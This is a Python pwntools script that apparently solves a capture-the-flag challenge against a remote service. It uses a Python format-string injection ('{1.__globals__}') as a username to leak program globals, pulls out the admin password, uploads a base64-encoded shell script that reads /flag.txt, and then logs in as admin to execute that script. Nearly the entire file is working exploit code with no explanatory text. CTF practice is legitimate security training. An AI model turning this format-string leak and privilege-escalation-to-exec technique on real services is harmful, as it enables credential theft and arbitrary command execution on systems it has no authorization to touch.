#!/usr/bin/env python3
from pwn import *
import re, base64

io = remote("385b5eacaf7a6e4f.chal.ctf.ae", 443, ssl=True)

io.sendlineafter(b": ", b"register")
io.sendlineafter(b": ", b"{1.__globals__}")
io.sendlineafter(b": ", b"abc")

io.sendlineafter(b": ", b"login")
io.sendlineafter(b": ", b"{1.__globals__}")
io.sendlineafter(b": ", b"abc")

match = re.search(r"'admin': \{'role': 'ADMIN', 'path': '[^']+', 'password': '([a-f0-9]+)'\}", io.recvline().decode())
if match: admin_pass = match.group(1)


script = b'''#!/bin/sh
cat /flag.txt
'''

io.sendlineafter(b': ', b'create_docs')
io.sendlineafter(b': ', b'')
io.sendlineafter(b': ', b'more')
io.sendlineafter(b': ', base64.b64encode(script))

io.sendlineafter(b": ", b"logout")
io.sendlineafter(b": ", b"login")
io.sendlineafter(b": ", b"admin")
io.sendlineafter(b": ", admin_pass.encode())

io.sendlineafter(b": ", b"manage_users")
io.sendlineafter(b": ", b"h")
io.sendlineafter(b": ", b"{1.__globals__}")
io.sendlineafter(b": ", b"b")

io.sendlineafter(b": ", b"global_docs")
io.sendlineafter(b": ", b"exec")

io.interactive()

